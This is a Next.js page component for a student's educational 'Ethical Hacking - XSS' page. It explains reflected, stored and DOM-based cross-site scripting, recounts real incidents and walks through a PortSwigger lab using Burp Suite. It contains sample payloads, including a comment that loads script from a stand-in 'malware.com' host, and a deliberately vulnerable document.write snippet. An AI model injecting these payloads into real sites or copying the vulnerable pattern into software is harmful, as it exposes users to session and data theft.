/* eslint-disable react/no-unescaped-entities */
"use client";
import Image from "next/image";
import { useEffect } from "react";

import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";

import {
  Carousel,
  CarouselContent,
  CarouselItem,
  CarouselNext,
  CarouselPrevious,
} from "@/components/ui/carousel";
import { Separator } from "@/components/ui/separator";

//References
//[1] "The end user’s browser has no way to know that the script should not be trusted, and will execute the script." https://owasp.org/www-community/attacks/xss/ Author: KirstenS
//[2] "This involves an application 'reflecting' malicious code via a HTTP request" https://brightsec.com/blog/xss/#reflected-xss Author: Admir Dizdar
//[3] "The most popular objects from this perspective are document.url, document.location, and document.referrer." https://www.acunetix.com/blog/articles/dom-xss-explained/ Author: Tomasz Andrezej Nidecki, Accessed 27/03/2024
//[4] "Change the contents of the web page through DOM manipulation" https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-8.0 Prevent Cross-Site Scripting (XSS) in ASP.NET Core Author: Rick Anderson Accessed 27/03/2024
//[5] "input validation is critical in any production grade software." https://www.linkedin.com/pulse/xss-prevention-using-input-validation-neeraj-malhotra/ XSS Prevention using Input Validation Author:Neeraj Malhotra Accessed 27/03/2024
//[6] " attackers modifified the script to send customer data to a amalciious server which hosted a fake SSL certificate." https://brightsec.com/blog/xss-attack/#real-life-examples Accessed 10/04/2024
//[7] "used to access other accounts outside eBay such as Paypal, Bank Accounts and Social Media platforms." https://www.eecs.yorku.ca/course_archive/2015-16/W/3482/Team12_eBayHacks.pdf Accessed 10/04/2024
//[8] "manual penetration testing or professional DAST " https://www.invicti.com/learn/dom-based-cross-site-scripting-dom-xss/ Accessed 20/04/2024
//[9] https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded Accessed 13/05/2024

const references = [
  //1
  {
    author: "S. Kirsten",
    year: "",
    title: "Cross Site Scripting (XSS)",
    url: "https://owasp.org/www-community/attacks/xss/",
    accessed: "27/03/2024",
  },
  //2
  {
    author: "A. Dizdar",
    year: "2022",
    title: "What is XSS? Impact, Types and Prevention",
    url: "https://brightsec.com/blog/xss/#reflected-xss",
    accessed: "27/03/2024",
  },
  //3
  {
    author: "T. Nidecki",
    year: "2019",
    title: "DOM XSS: An Explanation of DOM-based Cross-site Scripting",
    url: "https://www.acunetix.com/blog/articles/dom-xss-explained/",
    accessed: "27/03/2024",
  },
  //4
  {
    author: "R. Anderson",
    year: "2023",
    title: "Prevent Cross-Site Scripting (XSS) in ASP.NET Core",
    url: "https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-8.0",
    accessed: "27/03/2024",
  },
  //5
  {
    author: "N. Malhotra",
    year: "2016",
    title: "XSS Prevention using Input Validation",
    url: "https://www.linkedin.com/pulse/xss-prevention-using-input-validation-neeraj-malhotra/",
    accessed: "27/03/2024",
  },
  //6
  {
    author: "O. Moradov",
    year: "2022",
    title: "XSS Attack: 3 Real Life Attacks and Code Examples",
    url: "https://brightsec.com/blog/xss-attack/#real-life-examples",
    accessed: "10/04/2024",
  },
  //7
  {
    author: "J. Sidhu, R. Sakhuja, D. Zhou",
    year: "",
    title: "Attacks on Ebay",
    url: "https://www.eecs.yorku.ca/course_archive/2015-16/W/3482/Team12_eBayHacks.pdf",
    accessed: "10/04/2024",
  },
  //8
  {
    author: "P. Anwar",
    year: "",
    title: "DOM-based cross-site scripting",
    url: "https://www.invicti.com/learn/dom-based-cross-site-scripting-dom-xss/",
    accessed: "20/04/2024",
  },
  //9
  {
    author: "Portswigger",
    year: "",
    title: "Lab: Reflected XSS into HTML context with nothing encoded",
    url: "https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded",
    accessed: "13/05/2024",
  },
];

// const smoothScrollToReferences = () => {
//   const references = document.getElementById("references");
//   if (references) {
//     references.scrollIntoView({ behavior: "smooth" });
//   }
// };

// const YourPage = () => {
//   useEffect(() => {
//     smoothScrollToReferences();
//   }, []);
// };

export default function Home() {
  return (
    <main className="mb-12 mx-0  xl:mx-64">
      {/* Heading */}
      <div>
        <h1 className="flex text-4xl font-bold justify-center mt-12">
          {" "}
          Ethical Hacking - XSS{" "}
        </h1>
        <h2 className="flex font-semibold justify-center ">
          {" "}
          Created by Drew{" "}
        </h2>
      </div>
      {/* What is XSS? */}
      <div className="mt-6 mx-12">
        <h2 className="flex text-2xl font-semibold justify-center">
          {" "}
          What is XSS?{" "}
        </h2>
        <div className="text-lg xl:text-xl">
          XSS stands for
          <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-500 to-pink-500">
            {" "}
            Cross Site Scripting
          </span>
          . This is a security vulnerability in the web that occurs when a
          malicious user injects malicious scripts into web pages or web
          applications being viewed by others. If the app or website does not
          properly utilize data sanitization, an attacker is able to run their
          own malicious code or payloads on the vulnerable website. This type of
          vulnerability is quite dangerous as the end user’s browser has no way
          to know that the script should not be trusted, and will execute the
          script
          <span className="text-gray-600 font-bold">
            {" "}
            <a href="#references" className="underline">
              [1]
            </a>
          </span>
          . XSS can have serious consequences. Attackers can use this method to
          steal session cookies and effectively steal identities of the user. It
          can also be used to deface pages on the web, spread malicious programs
          and viruses, phish for user data and private credentials and much
          more.
          <br />
          {/* Common Causes */}
          <div className="mt-4">
            <h2 className="flex text-2xl font-semibold justify-center">
              The Most Common Causes
            </h2>
            <div className="text-lg xl:text-xl">
              Input validation is critical in any production grade software.
              <span className="text-gray-600 font-bold">
                {" "}
                <a href="#references" className="underline">
                  [5]
                </a>
              </span>{" "}
              There are many ways for malicious users to utilise XSS, especially
              with the different types of XSS that are at their disposal. One of
              the most common ways is
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-green-700 to-lime-500">
                {" "}
                Improper Input Validation
              </span>
              . This can be used to clean dodgy payloads and characters that are
              used in URL attacks as seen in reflected XSS. This can involve
              injecting characters (hex codes) into the URL, or modifying the
              URL to allow a certain script or chunk to be able to be executed.
              This can also be manipulated in websites that dynamically generate
              content via user inputs or user actions. This is a form of
              reflected XSS. <br />
              <br />
              Another prevolent way for attackers to utilise XSS effectively is
              when data has come from
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-500 to-violet-700">
                {" "}
                Untrusted Data Sources
              </span>
              . Again this issue arises due to lack of proper validation being
              put in place. This can refer to any external content that can
              interacts with the web application - especially when the assurance
              of security is limited. This could be contents such as API's,
              external wesbites, session data and again user inputs. Take
              external websites for example, content being scraped or embedded
              from other websites can contain malicious payloads in which can
              then be dissemenated to users of the application via
              advertisements, social media posts and widgets.
            </div>
          </div>
          <div className="font-semibold flex justify-center mt-2">
            Types of XSS:
          </div>
          <div className="flex justify-center -mt-8">
            <Carousel
              opts={{
                align: "start",
              }}
              orientation="horizontal"
              className="w-full max-w-xs"
            >
              <CarouselContent className="-ml-1 ">
                {Array.from({ length: 3 }).map((_, index) => (
                  <CarouselItem key={index} className="pt-10 ">
                    <div className="p-1">
                      <Card>
                        <CardContent className="flex items-center justify-center p-6">
                          <span className="text-3xl font-semibold">
                            {/* {index + 1} */}
                          </span>
                          <ul className="ml-4">
                            {index === 2 && (
                              <li className="text-emerald-500 font-bold flex justify-center">
                                DOM - Payload is injected via the DOM (e.g., in
                                a redirect)
                              </li>
                            )}
                            {index === 1 && (
                              <li className="text-violet-500 font-bold">
                                Stored - Payload gets stored by the server and
                                runs whenever that page is accessed
                              </li>
                            )}
                            {index === 0 && (
                              <li className="text-orange-500 font-bold">
                                Reflected - Payload has to be run by the user
                              </li>
                            )}
                          </ul>
                        </CardContent>
                      </Card>
                    </div>
                  </CarouselItem>
                ))}
              </CarouselContent>
              <CarouselPrevious />
              <CarouselNext />
            </Carousel>
          </div>
          {/* Reflected XSS */}
          <div className="mt-2">
            Reflected XSS is one of the simplest forms of cross site scripting.
            This involves an application 'reflecting' malicious code via a HTTP
            request{" "}
            <span className="text-gray-600 font-bold">
              {" "}
              <a href="#references" className="underline">
                [2]
              </a>
            </span>
            . In doing this the attackers don't send the malicious payload to
            the web application itself, however they send it to the victim via a
            URL that includes the payload, which is often deliberately made to
            be glanced over by the victim.
            <span className="font-bold text-gray-600"> EG.</span>
            <Card className="">
              <CardContent className="flex justify-center items-center py-2 text-center">
                <p className="text-gray-700">{`https://exampleweb-app.com/status?message=<script> ***malicious code goes here...*** </script>`}</p>
              </CardContent>
              <CardDescription className="p-2 flex justify-center text-center">
                When the user visits the URL, the script is executed and now has
                access to any action or data the victim has access to.
              </CardDescription>
            </Card>
          </div>
          <br />
          {/* Stored XSS */}
          <div>
            Stored (otherwise known as persistent) XSS is another form of cross
            site scripting. This involves an application storing the malicious
            payload for use in later HTTP responses. It is described as
            persistent XSS as it persists within the application for example in
            a database or server side text files. Then, the application executes
            the malicious script unkowingly, for every victim that visits its
            web pages. The data can come from any source that sends a request to
            the application, such as blogs, comments and visitor logs.
            <span className="font-bold text-gray-600"> EG.</span>
            <br />
            <Card>
              <CardHeader>
                <CardDescription className="text-center">
                  A video streaming website that allows customers to post
                  messages underneath videos. However, the system that allows
                  users to submit comments does not properly use input
                  validation, allowing users to embed HTML tags in the comments
                  they publish.
                </CardDescription>
              </CardHeader>
              <CardContent className="text-center text-gray-700">
                <p>
                  {`This video helped me so much with my Physics homework! "<script src=http://malware.com/stealyourdata.js></script> "`}{" "}
                </p>
              </CardContent>
            </Card>
          </div>
          <br />
          {/* DOM XSS */}
          <div>
            DOM based XSS has some similarities to reflected XSS. This attack
            can be used when an application or web page uses some sort of
            javascript - which is extremely common nowadays. The attack payload
            is used by changing the contents of the web page via DOM (Document
            Object Model) environment manipulation{" "}
            <span className="text-gray-600 font-bold">
              {" "}
              <a href="#references" className="underline">
                [4]
              </a>
            </span>
            , in the victims broswer. This attack usually involves the failure
            of legitimate javascript on the page able to sanitize user inputs.
            The most popular objects from this type of attack are document.url,
            document.location, and document.referrer.{" "}
            <span className="text-gray-600 font-bold">
              {" "}
              <a href="#references" className="underline">
                [3]
              </a>
            </span>
          </div>
          <Card>
            <CardHeader>
              <CardDescription className="text-center">
                Here is an example of a web application that takes a user's name
                from the URL parameter and displays it on a dashboard
              </CardDescription>
            </CardHeader>
            <CardContent className="text-center text-gray-700">
              <p>
                {`<html>
                  (...)
                  Dashboard for
                  <script>
                    var pos=document.URL.indexOf("context=")+8;
                    document.write(decodeURIComponent(document.URL.substring(pos)));
                  </script>
                  (...)
                  </html>`}{" "}
              </p>
            </CardContent>
            <CardDescription className="text-center pb-2">
              If we call http://www.example.com/dashboard.html?context=Drew{" "}
              <br />
              The attacker can utilise this to put their malicious code as such
              http://www.example.com/dashboard.html?context=(insert computer
              hacking here)
            </CardDescription>
          </Card>
          {/* <div className="flex flex-col">
            <span className="text-emerald-500 font-bold my-2">
              DOM - The code is injected into the DOM.
            </span>
            <span className="text-violet-500 font-bold mb-2">
              Server - The code is stored by the server and is executed whenever
              the specified URL is accessed.
            </span>
            <span className="text-orange-500 font-bold mb-2">
              Reflected - The code is executed manually by the user.
            </span>
          </div> */}
          {/* Impacts */}
          <div className="mt-8">
            <h2 className="flex text-2xl font-semibold justify-center">
              {" "}
              Impacts of XSS{" "}
            </h2>
            <div>
              Obviously nobody wants to get hacked or exploited, but what are
              the real implications that can arise due to to a malicious attack
              utilising XSS? Not only data leaks and website defacement, but
              also an immence lack of trust for all companies involved. 3 Case
              studies that showcase this is{" "}
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-pink-500 to-orange-700">
                {" "}
                British Airways
              </span>{" "}
              (2018),{" "}
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-orange-700 to-yellow-400">
                {" "}
                Fortnite{" "}
              </span>
              (2019) and{" "}
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-yellow-400 to-green-500">
                {" "}
                eBay
              </span>{" "}
              (2015).
              <br />
              <br />
              Magecart - A notorious hacker group known for credit card skimming
              attacks exploited the major multinational airline. They used a
              vulnerability in JavaScript via a library named Feedify. According
              to a brightsec blog, attackers modifified the script to send
              customer data to a amalciious server which hosted a fake SSL
              certificate.{" "}
              <span className="text-gray-600 font-bold">
                {" "}
                <a href="#references" className="underline">
                  [6]
                </a>
              </span>{" "}
              This in turn fooled users into believing their purchases were
              secure, when in reality the group perfoemed credit card skimming
              on 380,000 transactions before the attack was discovered.
              <br />
              <br />
              The popular online game Fortnite was victim to an XSS attack that
              affected almost 200 Million Users. A dormant unused page slipped
              past the developers which was vulnerable to an XSS attack that
              allowed attackers to gain access to the data of all Fortnite
              users. The attack was eventually discovered by security
              researchers at Check Point but in the time it was active, it is
              believed the attackers could buy in game currency at the victim's
              expense, access in game contacts, usernames and passwords.
              <br />
              <br />
              Even the biggest companies can fall victim to XSS attacks, such as
              eBay in 2015 and early 2016. Initially eBay thought the breach had
              come about by a phishing attack on employees however it was found
              by 3rd party security researchers that several other
              vulnerabilities were found aswell. The first of which, XSS. This
              caused catasrophic damage, allowing the hackers (Syrian Electronic
              Army) to steal a multitude of information such as names, DOB,
              passwords and other info. This info gathered initially was then
              used to access other accounts outside eBay such as Paypal, Bank
              Accounts and Social Media platforms.{" "}
              <span className="text-gray-600 font-bold">
                {" "}
                <a href="#references" className="underline">
                  [7]
                </a>
              </span>
            </div>
          </div>
          {/* Testing */}
          <div className="mt-8">
            <h2 className="flex text-2xl font-semibold justify-center">
              {" "}
              How to test for it{" "}
            </h2>
            <div>
              Testing for XSS can sometimes be very simple, even more so via
              specialist software such as{" "}
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-red-600 to-indigo-500">
                Burp Suite
              </span>
              . In Reflected XSS a great start is by checking URLs and seeing if
              there are any parameters that users can exploit is an excellent
              start. Usually parameters like this come after symbols{" "}
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-red-600 to-indigo-500">
                ?
              </span>{" "}
              and{" "}
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-red-600 to-indigo-500">
                &
              </span>
              . If any of these parameters have a significant effect on the
              webpage at hand and its functionality, this is a{" "}
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-l from-amber-400 to-amber-500">
                gold mine
              </span>{" "}
              for malicious users. Similarly with stored xss testing every input
              field with a unique payload is a good way to see if external
              Javascript can be executed - a simple way could be using the
              console such as{" "}
              <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-red-600 to-indigo-500">{`<script>console.log("xss vulnerable")</script>`}</span>{" "}
              which would show a line in the console which shows it may be
              vulnerable. Using this method we can identify cracks in the code
              and remedy them quickly.
              <br />
              <br />
              For DOM based xss, manual penetration tetsting or professional
              DAST scanners
              <span className="text-gray-600 font-bold">
                {" "}
                <a href="#references" className="underline">
                  [8]{" "}
                </a>
              </span>
              are believed to be the most effective way to detect this type of
              XSS attack as the majority of web based security tools fail to
              test for it. Again using devloper tools and going through each
              individual source and inputting payloads to see if they are secure
              or not.
            </div>
          </div>
        </div>
        {/* Example */}
        <div className="mt-8">
          <h2 className="flex text-2xl font-semibold justify-center">
            {" "}
            Example{" "}
          </h2>
          <div className="text-lg xl:text-xl">
            Here i will be showing a step-by-step guide on how to test for
            <span className="font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-600 to-indigo-200">
              {" "}
              REFLECTED{" "}
            </span>{" "}
            <span className="font-bold bg-clip-text text-transparent bg-gradient-to-l from-blue-600 to-indigo-200">
              {" "}
              XSS{" "}
            </span>{" "}
            manually using Burp Suite. Burp Suite can do this via the scanner
            tool but to give a proper demonstration i will do this via the burp
            repeater tool to show how sites can be exploited by malicious users.
            <br />
            <br />
            First of all we will need to do is set up Burp Suite. this is
            simple, all we need to do her is put the URL of our site we want to
            test into Burp Suite. Here i am using a semi-realistic website that
            is meant to be exploited courtesy of Portswigger{" "}
            <span className="text-gray-600 font-bold">
              {" "}
              <a href="#references" className="underline">
                [9]
              </a>
            </span>
            .
            <br />
            <Image
              src="/dashboard 2.png"
              width={4000}
              height={1000}
              quality={100}
              alt="Dashboard Burp"
              className="w-full rounded-xl shadow-lg"
            />
            <br />
            <br />
            Now we have to identify a point of entry in the website that allows
            for code to be reflected or displayed immediately, after a request
            is fulfilled, i started off with the search box for example. <br />
            <Image
              src="/Identify Reflected.png"
              width={5000}
              height={100}
              quality={100}
              alt="Burp Proxy"
              className="w-full rounded-xl shadow-lg"
            />
            <br />
            <Image
              src="/testing1.png"
              width={4000}
              height={100}
              quality={100}
              alt="Search"
              className="w-full rounded-xl shadow-lg"
            />
            <br />
            <br />
            After we have identified a reflected input, we then send it to the
            Burp Repeater for further analysis. Here we can see where in the
            code this occurs and then exploit it for our use. Here we send
            another request so we can pin point where abouts in the code this
            occurs.
            <br />
            <Image
              src="/H1.png"
              width={4000}
              height={100}
              quality={100}
              alt="IDENTIFY H1"
              className="w-full rounded-xl shadow-lg"
            />
            <br />
            <br />
            Now we know exactly where to send our payload, we can now input
            malicious code there, we can use a simple alert for example.
            <br />
            <Image
              src="/YBH BURP.png"
              width={5000}
              height={1000}
              quality={100}
              alt="Burp YBH"
              className="w-full rounded-xl shadow-lg"
            />
            <br />
            <br />
            And now if we open up the browser the alert is shown, also being
            reflected in the URL.
            <br />
            <Image
              src="/YBH 2.png"
              width={5000}
              height={1000}
              quality={100}
              alt="YBH"
              className="w-full rounded-xl shadow-lg"
            />
            Now if this site was live, widespread and public with many active
            users, all it takes is this simple h1 tag for a real exploiter to
            cause serious harm. This shows how XSS can be extremely dangerous
            for companies and website owners alike..
            <br />
            <br />
          </div>
        </div>
        <Separator className=" flex justify-center" />
        {/* REFERENCES & CREDITS */}
        <div id="references" className="mt-8 ">
          <h2 className="flex text-2xl font-semibold justify-center">
            {" "}
            References{" "}
          </h2>
          <div className="text-md xl:text-lg">
            <br />
            {references.map((reference, index) => (
              <div key={index}>
                {index + 1}. {reference.author}
                {reference.year && ` (${reference.year})`}, '{reference.title}',
                <a
                  href={reference.url}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="font-bold underline"
                >
                  {" "}
                  {reference.url}
                </a>{" "}
                - Accessed {reference.accessed}
                <br />
                <br />
              </div>
            ))}
          </div>
          <h2 className="flex font-semibold justify-center text-gray-300">
            {" "}
            Created by Andrew Sodeinde, 2024, For Ethical Hacking.{" "}
          </h2>
        </div>
      </div>
    </main>
  );
}
